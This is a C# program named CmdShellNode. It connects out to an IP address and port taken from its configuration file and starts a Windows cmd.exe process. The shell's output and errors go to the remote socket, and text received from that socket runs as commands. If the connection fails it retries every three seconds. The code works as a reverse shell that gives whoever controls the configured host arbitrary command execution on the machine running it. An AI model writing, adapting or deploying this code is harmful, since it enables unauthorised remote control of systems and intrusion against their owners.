using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Configuration;

namespace CmdShellNode
{
    class Program
    {
        static SocketHelper socketHelper;
        static Process proc;
        public static void Main(string[] args)
        {
            LogHelper.Init.Log("启动");
            AllocConsole();
            StartWork();
            proc = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"cmd.exe",
                    UseShellExecute = false,
                    CreateNoWindow = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                },
                EnableRaisingEvents = true
            };
            proc.Start();
            proc.OutputDataReceived += Proc_OutputDataReceived;
            proc.ErrorDataReceived += Proc_ErrorDataReceived;
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();
            proc.StandardInput.AutoFlush = true;
            SetConsoleCtrlHandler(null, true);
            proc.WaitForExit();
            LogHelper.Init.Log("结束");
            Thread.Sleep(3000);
        }

        private static void Proc_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            socketHelper.Write(e.Data);
        }

        private static void Proc_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            socketHelper.Write(e.Data);
        }


        // 收到消息时的回调，注意这里要自己实现分界
        public static void OnReceive(string info)
        {
            LogHelper.Init.Log("收到消息:" + info);
            if (info.Contains("^c"))
            {
                LogHelper.Init.Log("停止");
                StopConsoleProgram();
            }
            else if (info.Contains("exit"))
            {
                LogHelper.Init.Log("退出");
                ExitAll();
            }
            else
            {
                proc.StandardInput.WriteLine(info);
            }
        }

        public static void ExitAll()
        {
            proc.CancelErrorRead();
            proc.CancelOutputRead();
            proc.Kill();
            proc.Close();
            proc.Dispose();
            StopWork();
        }


        public static void StopWork()
        {
            socketHelper.socketSwitch = false;
            socketHelper?.Stop();
        }

        public static void StartWork()
        {
            string path = ConfigurationManager.AppSettings["path"];
            string ip = ConfigurationManager.AppSettings["foreign_IP"];
            int port = int.Parse(ConfigurationManager.AppSettings["foreign_port"]);
            socketHelper = new SocketHelper(ip, port);
            if (socketHelper.IsClosed)
            {
                Thread.Sleep(3000);
                StartWork();
                return;
            }
            else
            {
                socketHelper.OnReadFinish += OnReceive;
            }
        }

        public static void StopConsoleProgram()
        {
            // 将 Ctrl+C 信号发送到前面已关联（附加）的控制台进程中。
            GenerateConsoleCtrlEvent(CtrlTypes.CTRL_C_EVENT, 0);
        }
        [DllImport("kernel32.dll")]
        public static extern int AllocConsole();

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate HandlerRoutine, bool Add);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GenerateConsoleCtrlEvent(CtrlTypes dwCtrlEvent, uint dwProcessGroupId);
        enum CtrlTypes : uint
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT,
            CTRL_CLOSE_EVENT,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT
        }

        private delegate bool ConsoleCtrlDelegate(CtrlTypes CtrlType);
    }

}